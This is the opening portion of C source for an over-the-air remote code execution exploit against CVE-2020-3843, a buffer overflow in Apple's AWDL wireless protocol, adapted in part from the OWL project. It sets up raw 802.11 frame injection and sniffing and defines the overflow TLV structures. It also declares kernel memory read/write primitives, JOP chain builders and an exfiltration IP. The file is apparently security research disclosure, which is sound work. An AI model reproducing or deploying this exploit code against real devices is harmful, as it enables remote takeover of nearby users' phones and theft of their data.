// @i41nbeer

// portions of this project are adapted from the OWL opensource project:
// https://github.com/seemoo-lab/owl
// these portions are used under the following license:

/*
 * OWL: an open Apple Wireless Direct Link (AWDL) implementation
 * Copyright (C) 2018  The Open Wireless Link Project (https://owlink.org)
 * Copyright (C) 2018  Milan Stute
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

// many thanks to the OWL team for their work!

/*
 This is an exploit for CVE-2020-3843, a buffer overflow in AWDL.
 This is P0 issue 1982 https://bugs.chromium.org/p/project-zero/issues/detail?id=1982

 Earlier this year I released a simple proof-of-concept ending with the line:
   > no RCE??: that's part II ;-)

 Well, here's part II :-)

 See the accompanying blogpost for details
*/

#define _GNU_SOURCE

#include <stdarg.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/random.h>
#include <sys/stat.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>

#include <net/if.h>
#include <netinet/ether.h>

#include <linux/wireless.h>

#include <pcap/pcap.h>

#include "btle_awdl.h"

#define FIVE_G 1

char* exfil_ip = NULL;

void fail(const char* msg, ...) {
  va_list args;
  va_start(args, msg);
  printf("FAIL: ");
  vprintf(msg, args);
  printf("\n");
  exit(EXIT_FAILURE);
}

void log_msg(const char* msg, ...) {
  va_list args;
  va_start(args, msg);
  printf("LOG: ");
  vprintf(msg, args);
  printf("\n");
}

uint32_t rand32() {
  static int seeded = 0;

  if (!seeded) {
    uint32_t seed = 0;
    getrandom(&seed, 4, 0);
    srand(seed);
    seeded = 1;
  }

  return rand();
}
uint32_t port_reverse_lookup(uint64_t task, uint64_t target_port);
void build_jop_buffer(uint64_t base, uint64_t shared_cache_slide, uint64_t* initial_pc, uint64_t* initial_x0);
void build_mach_msg_jop_buffer(uint64_t base, uint64_t user_base, uint64_t shared_cache_slide, uint64_t* initial_pc, uint64_t* initial_x0, uint32_t thread_self, uint32_t task_self);


void* rkbuf(uint64_t kaddr, uint32_t len);
uint64_t rk64(uint64_t kaddr);
uint32_t rk32(uint64_t kaddr);
uint8_t rk8(uint64_t kaddr);

void wk64(uint64_t kaddr, uint64_t desired_value);
void wk32(uint64_t kaddr, uint32_t desired_value);
void wk16(uint64_t kaddr, uint16_t desired_value);

void wkbuf(uint64_t kaddr, uint8_t* desired_value, uint32_t len);
void wkbuf_checked(uint64_t kaddr, uint8_t* buf, uint32_t len);

uint64_t
aarch64_page_table_lookup(uint64_t ttbr, uint64_t vaddr,
                          uint64_t *l1_tte_, uint64_t *l2_tte_, uint64_t *l3_tte_);

void init_physmem(uint64_t kaslr_slide);
uint64_t phystokv(uint64_t pa);

uint64_t vm_map_lookup_entry(uint64_t vm_map, uint64_t address);

struct ether_addr reader_peers[8];


int generic_sock = -1;
char* injection_interface_name = NULL;

int get_generic_socket() {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        printf("unable to get AF_INET socket...\n");
    }
    return fd;
}

void set_injection_power_level(char* interface_name, int power_level) {
    if (generic_sock == -1) {
        generic_sock = get_generic_socket();
    }

    struct iwreq req = {0};

    strncpy(req.ifr_name, interface_name, IFNAMSIZ);

    req.u.txpower.value = power_level;
    req.u.txpower.fixed = 1;
    req.u.txpower.flags = 0; // value unit is is dBm

    int err = ioctl(generic_sock, SIOCSIWTXPOW, &req);
    if (err != 0) {
        log_msg("unable to set power level for interface %s to %d", interface_name, power_level);
    }
}
/*
int current_power_level = 30;

void decrease_power_level() {
    current_power_level -= 1;;
    printf("setting power level to: %d\n", current_power_level);
    set_injection_power_level(injection_interface_name, current_power_level);
}
*/
void set_high_injection_power_level() {
    set_injection_power_level(injection_interface_name, 100);
}

void set_low_injection_power_level() {
    set_injection_power_level(injection_interface_name, 1);
}


int using_fast_read = 0;
struct ether_addr regen_peer;
uint16_t regen_peer_id = 0;

void* arbitrary_read_fast(uint64_t target_kaddr, uint32_t target_len);

#define TEN_TO_THE_NINE 1000000000

uint64_t now_nanoseconds() {
  struct timespec tv = {0};
  clock_gettime(CLOCK_REALTIME, &tv);
  uint64_t nanoseconds = ((uint64_t)tv.tv_sec) * TEN_TO_THE_NINE; // 1*10^9 nano seconds in a second
  nanoseconds += tv.tv_nsec;
  return nanoseconds;
}

struct timespec nanoseconds_to_timespec(uint64_t nanoseconds) {
  struct timespec ts = {0};
  ts.tv_sec  = nanoseconds/TEN_TO_THE_NINE;
  ts.tv_nsec = nanoseconds - (ts.tv_sec*TEN_TO_THE_NINE);
  return ts;
}

void print_now(char* str) {
  uint64_t nano = now_nanoseconds();
  printf("(%s) ns: %lld us: %lld  ms: %lldzn\n", str, nano, nano/1000, nano/(1000*1000));
}

pcap_t* setup_wlan_device_faster(const char* if_name) {
  unsigned int if_index = if_nametoindex(if_name);
  if (if_index == 0) {
    fail("unable to resolve the network inteface %s to a valid interface number, check the interface name", if_name);
  }
  log_msg("resolved interface %s to index %d", if_name, if_index);

  // open the device
  char errbuf[PCAP_ERRBUF_SIZE] = {0};
  pcap_t* pcap_handle = pcap_create(if_name, errbuf);
  if (pcap_handle == NULL) {
    fail("unable to pcap_create handle for interface %s. pcap error message: %s", if_name, errbuf);
  }
  log_msg("created pcap device handle");

  int pcap_err;
  pcap_err = pcap_set_snaplen(pcap_handle, 0xffff);
  if (pcap_err != 0) {
    fail("pcap_set_snaplen failed");
  }

  pcap_err = pcap_set_promisc(pcap_handle, 1);
  if (pcap_err != 0) {
    fail("pcap_set_promisc failed");
  }

/*
  pcap_err = pcap_set_rfmon(pcap_handle, 1);
  if (pcap_err != 0) {
    fail("pcap_set_rfmon failed");
  }
*/
  // set immediate mode instead of a timeout:
  pcap_set_immediate_mode(pcap_handle, 1);


  pcap_err = pcap_set_timeout(pcap_handle, 1);
  if (pcap_err != 0) {
    fail("pcap_set_timeout failed");
  }

  // activate the handle
  pcap_err = pcap_activate(pcap_handle);
  if (pcap_err != 0) {
    fail("pcap_activate failed");
  }


  // check that we're going to get radiotap headers
  int datalink_type = pcap_datalink(pcap_handle);
  if (datalink_type != DLT_IEEE802_11_RADIO) {
    fail("this handle isn't going to give us radiotap headers");
  }

  return pcap_handle;
}

pcap_t* setup_wlan_device_faster_sniffer(const char* if_name) {
  unsigned int if_index = if_nametoindex(if_name);
  if (if_index == 0) {
    fail("unable to resolve the network inteface %s to a valid interface number, check the interface name", if_name);
  }
  log_msg("resolved interface %s to index %d", if_name, if_index);

  // open the device
  char errbuf[PCAP_ERRBUF_SIZE] = {0};
  pcap_t* pcap_handle = pcap_create(if_name, errbuf);
  if (pcap_handle == NULL) {
    fail("unable to pcap_create handle for interface %s. pcap error message: %s", if_name, errbuf);
  }
  log_msg("created pcap device handle");

  int pcap_err;
  pcap_err = pcap_set_snaplen(pcap_handle, 0xffff);
  if (pcap_err != 0) {
    fail("pcap_set_snaplen failed");
  }

  pcap_err = pcap_set_promisc(pcap_handle, 1);
  if (pcap_err != 0) {
    fail("pcap_set_promisc failed");
  }
/*
  pcap_err = pcap_set_rfmon(pcap_handle, 1);
  if (pcap_err != 0) {
    fail("pcap_set_rfmon failed");
  }
*/
  // set immediate mode instead of a timeout:
  pcap_set_immediate_mode(pcap_handle, 1);


  pcap_err = pcap_set_timeout(pcap_handle, 1);
  if (pcap_err != 0) {
    fail("pcap_set_timeout failed");
  }
  
  // activate the handle
  pcap_err = pcap_activate(pcap_handle);
  if (pcap_err != 0) {
    pcap_perror(pcap_handle, "pcap_activate failed\n");
    fail("pcap_activate failed");
  }

  printf("activated\n");


  struct bpf_program fp;
  const char* filter_str = "type ctl subtype ack || type mgt"; //"type ctl";
  pcap_err = pcap_compile(pcap_handle, &fp, filter_str, 1, PCAP_NETMASK_UNKNOWN);
  if (pcap_err != 0) {
    fail("pcap_compile failed");
  }

  printf("compiled\n");

  pcap_err = pcap_setfilter(pcap_handle, &fp);
  if (pcap_err != 0) {
    fail("pcap_setfilter failed");
  }
  printf("set filter\n");



  // check that we're going to get radiotap headers
  int datalink_type = pcap_datalink(pcap_handle);
  if (datalink_type != DLT_IEEE802_11_RADIO) {
    fail("this handle isn't going to give us radiotap headers");
  }

  return pcap_handle;
}

void* try_early_read(uint64_t kaddr, size_t* out_size);
void init_early_read(struct ether_addr dst, char* phy_str);

struct ieee80211_radiotap_header_compat {
  uint8_t version;
  uint8_t pad;
  uint16_t len;
  uint32_t present;
} __attribute__((packed));

struct ieee80211_hdr {
  uint16_t frame_control;
  uint16_t duration_id;
  struct ether_addr dst_addr;
  struct ether_addr src_addr;
  struct ether_addr bssid_addr;
  uint16_t seq_ctrl;
} __attribute__((packed));

struct ieee80211_ack {
  uint16_t frame_control;
  uint16_t duration_id;
  struct ether_addr dst_addr;
} __attribute__((packed));

struct oui {
  uint8_t bytes[3];
} __attribute__((packed));

struct awdl_action {
  uint8_t category;
  struct oui oui;
  uint8_t type;
  uint8_t version;
  uint8_t subtype;
  uint8_t reserved;
  uint32_t phy_tx;
  uint32_t target_tx;
} __attribute__((packed));

const struct oui awdl_oui = {0x00, 0x17, 0xf2};

struct awdl_sync_params_tlv {
  uint8_t type;
  uint16_t length; // +0x01
  uint8_t next_aw_channel; // +0x03
  uint16_t tx_down_counter; // +0x04
  uint8_t master_channel; // +0x06
  uint8_t guard_time; // +0x07
  uint16_t aw_period; // +0x08 /* AW period in TUs */
  uint16_t af_period; // +0x0a /* how often action frames are sent out in TUs */
  uint16_t flags; // +0x0c
  uint16_t aw_ext_length; // +0x0e /* length of an extended AW in TUs */
  uint16_t aw_com_length; // +0x10/* length of a regular AW in TUs */
  uint16_t remaining_aw_length; // +0x12
  uint8_t min_ext; // +0x14
  uint8_t max_ext_multicast; // +0x15
  uint8_t max_ext_unicast; // +0x16
  uint8_t max_ext_af; // +0x17
  struct ether_addr master_addr; // +0x18
  uint8_t presence_mode;// +0x1e
  uint8_t reserved; // +0x1f
  uint16_t next_aw_seq; // +0x20
  uint16_t ap_alignment; // 0x22              // +0x1f

  // CHANSEQ
  uint8_t count; // +0x24                      // +0x21
  uint8_t encoding; // +0x25                   // +0x22
  uint8_t duplicate_count; // +0x26            // +0x23
  uint8_t step_count; // +0x27                 // +0x24
  uint16_t fill_channel; //+0x28               // +0x25

  uint16_t seq[16]; //+0x2a
  // +0x4a

  // +0x24 must be a length (chanseq len? and must be less than 0x1f
  /* struct awdl_chanseq chanseq; */
  /* uint8_t pad[2]; */
} __attribute__((__packed__));

struct service_response_tlv {
  uint8_t type;
  uint16_t len;
  uint16_t s_1;
  uint8_t key_buf[2];
  uint16_t v_1;
  uint16_t v_2;
  uint16_t val_buf[2];
} __attribute__((packed));


struct data_path_tlv {
  uint8_t type;
  uint16_t len;
  uint16_t flags;
  char country_code[3];
  uint16_t social_channels;
  struct ether_addr awdl_addr;
  uint16_t ext_flags;
} __attribute__((packed));

struct unicast_data_path_tlv {
  uint8_t type;
  uint16_t length;
  uint16_t flags;
  uint8_t country_code[3];
  uint16_t social_channel_map;
  uint8_t infra_bssid[6];
  uint16_t infra_channel;
  uint8_t infra_addr[6];
  uint8_t awdl_addr[6];
  uint32_t unicast_options;
} __attribute__((packed));

struct service_params_tlv {
  uint8_t type;
  uint16_t len;
  uint8_t unk[3];
  uint16_t sui;
  uint32_t bitmask;
} __attribute__((packed));


struct ht_caps_tlv {
  uint8_t type;
  uint16_t length;
  uint16_t unk;
  uint16_t ht_capabilities;
  uint8_t ampdu_capabilities;
  uint8_t rx_mcs;
  uint16_t unk_2;
} __attribute__((packed));

struct chan_seq_tlv {
  uint8_t type;
  uint16_t length;
  uint8_t count;
  uint8_t encoding;
  uint8_t duplicate_count;
  uint8_t step_count;
  uint16_t fill_channel;
  uint16_t seq[16];
} __attribute__((packed));



// TLV for the buffer overflow
struct sync_tree_tlv {
  uint8_t type;
  uint16_t length;
  uint8_t buf[0];
} __attribute__((packed));

// TLV for triggering the allocation of bsssteering blobs
struct bss_steering_tlv {
  uint8_t type;
  uint16_t length;
  uint32_t steeringMsgID;
  uint32_t steeringMsgLen;
  uint32_t peer_count;
  struct ether_addr peer_macs[8];
  struct ether_addr BSSID;
  uint32_t steeringTimeoutThreshold;
  uint32_t SSID_len;
  uint8_t infra_channel;
  uint32_t steeringCmdFlags;
  char SSID[32];
} __attribute__((packed));

pcap_t* global_pcap_handle = NULL;
pcap_t* second_global_pcap_handle = NULL;

void hexdump(uint8_t* bytes, uint32_t size) {
  int col = 0;
  for(; size > 0; size--) {
    printf("%02x ", *bytes++);
    col += 1;
    col %= 16;
    if (col == 0) {
      printf("\n");
    }
  }
  printf("\n");
}


uint8_t awdl_version(int major, int minor) {
  return ((uint8_t) (((major) << 4) & 0xf0) | ((minor) & 0x0f));
}

#define IEEE80211_VENDOR_SPECIFIC 127
#define AWDL_TYPE 8
#define AWDL_VERSION_COMPAT awdl_version(1,0)

#define AWDL_ACTION_PSF 0
#define AWDL_ACTION_MIF 3


#define IEEE80211_FCTL_FTYPE 0x000c
#define IEEE80211_FCTL_STYPE 0x00f0

#define IEEE80211_FTYPE_MGMT   0x0000
#define IEEE80211_STYPE_ACTION 0x00d0

const struct ether_addr awdl_bssid = {0x00, 0x25, 0x00, 0xff, 0x94, 0x73};

uint64_t clock_time_us() {
  struct timespec now = {0};

  int err = clock_gettime(CLOCK_MONOTONIC, &now);
  if (err) {
    fail("can't get current time");
  }
  uint64_t us = now.tv_sec * 1000000;
  us += now.tv_nsec / 1000;
  return us;
}


#ifdef FIVE_G

// this array is from wifi packet injection tutorial https://gist.github.com/jonhoo/7780260
static uint8_t u8aRadiotapHeader[] = {

  0x00, 0x00, // <-- radiotap version (ignore this)
  0x24, 0x00, // <-- number of bytes in our header (count the number of "0x"s)

  /**
   * The next field is a bitmap of which options we are including.
   * The full list of which field is which option is in ieee80211_radiotap.h,
   * but I've chosen to include:
   *   0x00 0x01: timestamp
   *   0x00 0x02: flags
   *   0x00 0x03: rate
   *   0x00 0x04: channel
   *   0x80 0x00: tx flags (seems silly to have this AND flags, but oh well)
   */
  0x0f, 0x80, 0x00, 0x00,

  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // <-- timestamp

  /**
   * This is the first set of flags, and we've set the bit corresponding to
   * IEEE80211_RADIOTAP_F_FCS, meaning we want the card to add a FCS at the end
   * of our buffer for us.
   */
  0x10,

  0x18, // <-- rate (12.0 Mb/s) // 0x18 should be 12 mbps, but we're getting a max of 6
  0x64, 0x14, 0x40, 0x01, // <-- channel (0x1464 Mhz (5220))

  /**
   * This is the second set of flags, specifically related to transmissions. The
   * bit we've set is IEEE80211_RADIOTAP_F_TX_NOACK, which means the card won't
   * wait for an ACK for this frame, and that it won't retry if it doesn't get
   * one.
   */
  0x08, 0x00,


  // VHT (12 bytes)
  0x04, 0x00, // known: 0x0004 == guard interval
              //        0x0040 == bandwidth known

  0x00,       // flags

  0x01,       // bandwidth (probably 1 or 2 or 3)

  0x01,       // vht_mcs (high nibble) and vht_nss (low nibble)
  0x00,       // other 3 mcs_nss pairs (ignored)
  0x00,
  0x00,

  0x00,      // coding (ignored?)

  0x00,      // group_id (ignored?)

  0x00, 0x00,// partial_aid (ignored?)

/*
  IEEE80211_RADIOTAP_MCS_HAVE_MCS | IEEE80211_RADIOTAP_MCS_HAVE_GI | IEEE80211_RADIOTAP_MCS_HAVE_BW,
  IEEE80211_RADIOTAP_MCS_BW_40, 0x00, // MCS flags
  */
};


#else

// this array is from wifi packet injection tutorial https://gist.github.com/jonhoo/7780260
static uint8_t u8aRadiotapHeader[] = {

  0x00, 0x00, // <-- radiotap version (ignore this)
  0x18, 0x00, // <-- number of bytes in our header (count the number of "0x"s)

  /**
   * The next field is a bitmap of which options we are including.
   * The full list of which field is which option is in ieee80211_radiotap.h,
   * but I've chosen to include:
   *   0x00 0x01: timestamp
   *   0x00 0x02: flags
   *   0x00 0x03: rate
   *   0x00 0x04: channel
   *   0x80 0x00: tx flags (seems silly to have this AND flags, but oh well)
   */
  0x0f, 0x80, 0x00, 0x00,

  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // <-- timestamp

  /**
   * This is the first set of flags, and we've set the bit corresponding to
   * IEEE80211_RADIOTAP_F_FCS, meaning we want the card to add a FCS at the end
   * of our buffer for us.
   */
  0x10,

  0x00, // <-- rate  (00 -> 1mbps, 0x18 -> 12 mbps, 0x16 -> 11 mbps)
  0x00, 0x00, 0x00, 0x00, // <-- channel

  /**
   * This is the second set of flags, specifically related to transmissions. The
   * bit we've set is IEEE80211_RADIOTAP_F_TX_NOACK, which means the card won't
   * wait for an ACK for this frame, and that it won't retry if it doesn't get
   * one.
   */
  0x08, 0x00,
};

#endif

typedef struct pkt_buf {
  size_t len;
  uint8_t buf[];
} pkt_buf_t;

pkt_buf_t* pkt_buf_wrap(void* buffer, size_t len) {
  size_t total_size = len + sizeof(pkt_buf_t);
  pkt_buf_t* pkt = malloc(total_size);
  pkt->len = len;
  memcpy(pkt->buf, buffer, len);
  return pkt;
}

void pkt_buf_free(pkt_buf_t* pkt) {
  free(pkt);
}

#define PKT_END() (pkt_buf_wrap(NULL, 0))

void* reassemble_packet(size_t* out_size, pkt_buf_t* first, va_list rest) {
  // we will iterate the argument list twice
  // since we are only passed the va_list we need to make a copy to do that:

  va_list copy;
  va_copy(copy, rest);

  if (first->len == 0) {
    fail("reassembling empty packet buffer");
  }

  // compute total size:
  size_t total_size = first->len;

  while (1) {
    pkt_buf_t* elem = va_arg(rest, pkt_buf_t*);
    if (elem->len == 0) {
      // this is the last element:
      break;
    }
    total_size += elem->len;
  }

  uint8_t* buffer = malloc(total_size+4);
  memset(buffer, 0, total_size);

  // copy in chunks
  size_t offset = 0;
  memcpy(buffer, first->buf, first->len);

  offset += first->len;
  pkt_buf_free(first);

  // have to use the copy the second time round:
  while (1) {
    pkt_buf_t* elem = va_arg(copy, pkt_buf_t*);
    if (elem->len == 0) {
      // this is the last element:
      break;
    }
    memcpy(&buffer[offset], elem->buf, elem->len);
    offset += elem->len;
    pkt_buf_free(elem);
  }

  if (offset != total_size) {
    fail("reassembly failed: offset != total_size");
  }

  *out_size = total_size;
  return buffer; 
}



/*****
new injection and monitoring API
******/

// the mutex protects the following variables:

//pthread_mutex_t ack_mutex = PTHREAD_MUTEX_INITIALIZER;
//pthread_cond_t ack_cond = PTHREAD_COND_INITIALIZER;

pthread_mutex_t sniff_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t sniff_cond = PTHREAD_COND_INITIALIZER;

// ACK related variables
int waiting_for_ack = 0;
struct ether_addr pending_ack_mac = {0};
int got_ack = 0;

// action frame related variables:
int waiting_for_AF = 0;
struct ether_addr AF_src_mac = {0};
//int got_AF = 0;
uint16_t target_tlv_type = 0;

uint8_t* sniffed_tlv = NULL;


// force enable related mutexes and condition variables
pthread_mutex_t force_enable_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t force_enable_cond = PTHREAD_COND_INITIALIZER;

int waiting_for_new_peer = 0;
struct ether_addr sniffer_new_peer_mac = {0};
int found_new_peer = 0;


struct ether_addr GLOBAL_TARGET_MAC = {0};

// monitors master indication frames for a bit, and will return the value of the tlv type
// provided if seen
void* try_get_TLV(uint8_t target_type) {
  pthread_mutex_lock(&sniff_mutex);

  memcpy(&AF_src_mac, &GLOBAL_TARGET_MAC, 6);

  waiting_for_AF = 1;
  //got_AF = 0;
  sniffed_tlv = NULL;
  target_tlv_type = target_type;

  uint64_t timeout_absolute_nano = now_nanoseconds() + 2000 * 1000 * 1000; // timeout after 2000 ms;

  struct timespec timeout_absolute_timespec = nanoseconds_to_timespec(timeout_absolute_nano);

  int ret = pthread_cond_timedwait(&sniff_cond, &sniff_mutex, &timeout_absolute_timespec);
  if (ret != 0 && ret != ETIMEDOUT) {
    perror("unexpected error from pthread_cond_timedwait\n");
  }

  waiting_for_AF = 0;
  if (sniffed_tlv == NULL) {
    // timed out, didn't see the target tlv
    pthread_mutex_unlock(&sniff_mutex);
    printf("timed out waiting for MI TLV\n");
    return NULL;
  }

  uint8_t* tlv_result = sniffed_tlv;
  sniffed_tlv = NULL;

  pthread_mutex_unlock(&sniff_mutex);

  return tlv_result;
}

void* get_TLV(uint8_t target_type) {
  void* buffer = NULL;

  while (1) {
    buffer = try_get_TLV(target_type);
    if (buffer) {
      return buffer;
    }
  }
}


int try_inject_internal(uint8_t* buffer, size_t total_size) {
  int success = 0;

  // extract out the src mac since we need it to determine whether the
  // ACK we see is being send to our spoofed src
  // TODO: don't use a fixed size for the RT headers..
  // TODO: fix this if we start injecting ACKs, since they're not this big...
  struct ieee80211_hdr* hdr = (struct ieee80211_hdr*)(buffer+sizeof(u8aRadiotapHeader));
  struct ether_addr src_mac = hdr->src_addr;

  pthread_mutex_lock(&sniff_mutex);

  waiting_for_ack = 1;
  pending_ack_mac = src_mac;
  got_ack = 0;

  int pcap_err;
  uint64_t start_nano = now_nanoseconds();
  do {
    pcap_err = pcap_inject(global_pcap_handle, buffer, total_size+4); // TODO: deal with this +4...
    if (pcap_err == PCAP_ERROR) {
      log_msg("pcap_inject failed with PCAP_ERROR");
      pcap_perror(global_pcap_handle, "inject failed");
    }
  } while (pcap_err == PCAP_ERROR);
  uint64_t end_nano = now_nanoseconds();
  //printf("injection took %lld us\n", (end_nano-start_nano)/1000);

  //log_msg("pcap_inject success (unreliable)");

  uint64_t timeout_absolute_nano = now_nanoseconds() + 16 * 1000 * 1000; // timeout after 16 ms;

  struct timespec timeout_absolute_timespec = nanoseconds_to_timespec(timeout_absolute_nano);

  int ret = pthread_cond_timedwait(&sniff_cond, &sniff_mutex, &timeout_absolute_timespec);
  
  // we'll reach here either because the condition variable was signaled
  // which means we got an ACK, or because we timed out.

  if (ret != 0 && ret != ETIMEDOUT) {
    perror("unexpected error from pthread_cond_timedwait\n");
  }

  // note that we hold the ack_mutex again now
  success = got_ack;

  got_ack = 0;
  waiting_for_ack = 0;

  pthread_mutex_unlock(&sniff_mutex);

  return success;
}

int try_inject(pkt_buf_t* first, ...) {
  int success = 0;

  // reassemble:
  va_list ap;

  va_start(ap, first);

  size_t total_size = 0;
  uint64_t start_nano = now_nanoseconds();
  uint8_t* buffer = reassemble_packet(&total_size, first, ap);
  uint64_t end_nano = now_nanoseconds();

  //printf("reassembly took %lld us\n", (end_nano-start_nano)/1000);

  va_end(ap);

  success = try_inject_internal(buffer, total_size);

  //printf("try_inject: %s", success?"YES":"NO");
  

  free(buffer);

  return success;
}

// infinite retries until it gets an ACK
void inject(pkt_buf_t* first, ...) {
  // reassemble:
  va_list ap;

  va_start(ap, first);

  size_t total_size = 0;
  uint64_t start_nano = now_nanoseconds();
  uint8_t* buffer = reassemble_packet(&total_size, first, ap);
  uint64_t end_nano = now_nanoseconds();

  //printf("reassembly took %lld us\n", (end_nano-start_nano)/1000);

  va_end(ap);

  uint32_t n_retries = 0;
  while (1) {
    int success = try_inject_internal(buffer, total_size);
    if (success) {
      break;
    }
    n_retries++;
  }

  printf("ACK after %d retries\n", n_retries);  

  free(buffer);
}

void ack_packet_handler(unsigned char* user,
    const struct pcap_pkthdr *h,
    const unsigned char *bytes) {
  if (h->caplen < sizeof(struct ieee80211_radiotap_header_compat)) {
    log_msg("captured packet not big enough for radiotap header, ignoring");
    return;
  }

  // we can get stuff like RSSI and receive time from the radiotap headers
  // for now, skip them

  uint16_t radiotap_len = ((struct ieee80211_radiotap_header_compat *)bytes)->len;
  //log_msg("radiotap len: %d\n", radiotap_len);
  bytes += radiotap_len;

  uint32_t remaining = h->caplen - radiotap_len;

  // h->caplen also include a 4 byte checksum, decrement the length by that
  // not checking the checksum yet
  if (remaining < 4) {
    log_msg("not enough space for the checksum, ignoring");
    return;
  }
  remaining -= 4;

  // acks are only 10 bytes
  if (remaining < sizeof(struct ieee80211_ack)) {
    //log_msg("captured packed not big enough for ieee80211 header, ignoring");
    return;
  }

  struct ieee80211_ack* ack = (struct ieee80211_ack *)bytes;    

  // what type of packet is this? looking for AWDL action frames
  // this is ignoring AMSDUs, is that okay?
  if ((ack->frame_control & (IEEE80211_FCTL_FTYPE | IEEE80211_FCTL_STYPE))
      ==
      (IEEE80211_FTYPE_MGMT | IEEE80211_STYPE_ACTION))
  {
    if (remaining < sizeof(struct ieee80211_hdr)) {
      return;
    }

    // now should have ieee80211 header
    struct ieee80211_hdr* hdr = (struct ieee80211_hdr *)bytes;    
    
    // bssid matches hardcoded AWDL bssid:
    if (memcmp(&hdr->bssid_addr, &awdl_bssid, 6) != 0) {
      log_msg("not for awdl_bssid");
      return; 
    }

    // is this an AWDL action frame?
    struct awdl_action* action_header = (struct awdl_action*)(hdr+1);
    remaining -= sizeof(struct ieee80211_hdr);

    if (remaining < sizeof(struct awdl_action)) {
      //log_msg("remaining less than sizeof awdl_action");
      return;
    }

    // some more checks that this really is an AWDL action frame:
    if (action_header->category != IEEE80211_VENDOR_SPECIFIC) {
      //log_msg("bad category (0x%0x), not AWDL", action_header->category);
      return;
    }

    if (memcmp(&action_header->oui, &awdl_oui, 3) != 0) {
      //log_msg("bad oui, not AWDL");
      return;
    }

    if (action_header->type != AWDL_TYPE) {
      //log_msg("type isn't AWDL");
      return;
    }

    if (action_header->version != AWDL_VERSION_COMPAT) {
      //log_msg("type isn't AWDL_VERSION_COMPAT (1,0)");
      return;
    }

    uint8_t subtype = action_header->subtype;
    if (subtype != AWDL_ACTION_PSF && subtype != AWDL_ACTION_MIF) {
      //log_msg("subtype isn't PSF or MIF (0x%x)", subtype);
      return;
    }

    // for now, lets just restrict this to MIFs..
    // TODO: does PSF generation go through relevant paths?
    if (subtype != AWDL_ACTION_MIF) {
      //printf("subtype isn't MIF\n");
      return;
    }
    
    // take the sniff mutex and see if anyone is waiting for this:
    pthread_mutex_lock(&sniff_mutex);
    if (!waiting_for_AF) {
      // no one wants this, continue;
      //printf("no one waiting for AF\n");
      pthread_mutex_unlock(&sniff_mutex);
      return;
    }

    // is this action from from the target?
    if (memcmp(&hdr->src_addr, &AF_src_mac, 6) != 0) {
      //printf("not from the desired source mac\n");
      pthread_mutex_unlock(&sniff_mutex);
      return;
    }

    uint8_t* buf = (uint8_t*)(action_header+1);
    remaining -= sizeof(struct awdl_action);

    // is the target TLV in there?
    for (;;) {
      if (remaining == 0) {
        break;
      }

      uint8_t* tlv = buf;

      uint8_t type = *buf++;
      remaining -= 1;

      if (remaining < 2) {
        break;
      }

      uint16_t len = *(uint16_t*)buf;
      buf += 2;
      remaining -= 2;

      if (remaining < len) {
        break;
      }

      if (type == target_tlv_type) {
        // make a copy, just the value:
        sniffed_tlv = malloc(len+3);
        memcpy(sniffed_tlv, tlv, len+3);
        break;
      }

      buf += len;
      remaining -= len;
    }

    if (!sniffed_tlv) {
      //printf("sniffed MIF doesn't contain target TLV (dst: %s)\n", ether_ntoa(&hdr->dst_addr));
      pthread_mutex_unlock(&sniff_mutex);
      return;
    }

    // got it, signal the sleeping sender
    waiting_for_AF = 0;

    pthread_cond_signal(&sniff_cond);

    pthread_mutex_unlock(&sniff_mutex);

  } else if (((ack->frame_control & 0x00ff) == 0x00d4) &&
      (ack->duration_id == 0) ) {
    static int cnt = 0;
    cnt++;
    //printf("ACK for %s (%d)\n", ether_ntoa(&ack->dst_addr), cnt);
    //print_now("ack");

    pthread_mutex_lock(&sniff_mutex);

    if (waiting_for_ack && (memcmp(&pending_ack_mac, &ack->dst_addr, 6) == 0)) {
      // signal the injecting thread that we've seen this ACK
      got_ack = 1;
      uint64_t start_nano = now_nanoseconds();
      pthread_cond_signal(&sniff_cond);
      uint64_t end_nano = now_nanoseconds();

      pthread_mutex_unlock(&sniff_mutex);
      //printf("pthread_cond_signal took %lld us\n", (end_nano-start_nano)/1000);
      return;
    }

    pthread_mutex_unlock(&sniff_mutex);

  } else {
    //printf("not ACK or AF\n");
  }

}

// looking for new AWDL peers
void enable_packet_handler(unsigned char* user,
    const struct pcap_pkthdr *h,
    const unsigned char *bytes) {
  if (h->caplen < sizeof(struct ieee80211_radiotap_header_compat)) {
    log_msg("captured packet not big enough for radiotap header, ignoring");
    return;
  }

  // we can get stuff like RSSI and receive time from the radiotap headers
  // for now, skip them

  uint16_t radiotap_len = ((struct ieee80211_radiotap_header_compat *)bytes)->len;
  //log_msg("radiotap len: %d\n", radiotap_len);
  bytes += radiotap_len;

  uint32_t remaining = h->caplen - radiotap_len;

  // h->caplen also include a 4 byte checksum, decrement the length by that
  // not checking the checksum yet
  if (remaining < 4) {
    log_msg("not enough space for the checksum, ignoring");
    return;
  }
  remaining -= 4;

  // acks are only 10 bytes
  if (remaining < sizeof(struct ieee80211_ack)) {
    //log_msg("captured packed not big enough for ieee80211 header, ignoring");
    return;
  }

  struct ieee80211_ack* ack = (struct ieee80211_ack *)bytes;    

  // what type of packet is this? looking for AWDL action frames
  // this is ignoring AMSDUs, is that okay?
  if ((ack->frame_control & (IEEE80211_FCTL_FTYPE | IEEE80211_FCTL_STYPE))
      ==
      (IEEE80211_FTYPE_MGMT | IEEE80211_STYPE_ACTION))
  {
    if (remaining < sizeof(struct ieee80211_hdr)) {
      return;
    }

    // now should have ieee80211 header
    struct ieee80211_hdr* hdr = (struct ieee80211_hdr *)bytes;    
    
    // bssid matches hardcoded AWDL bssid:
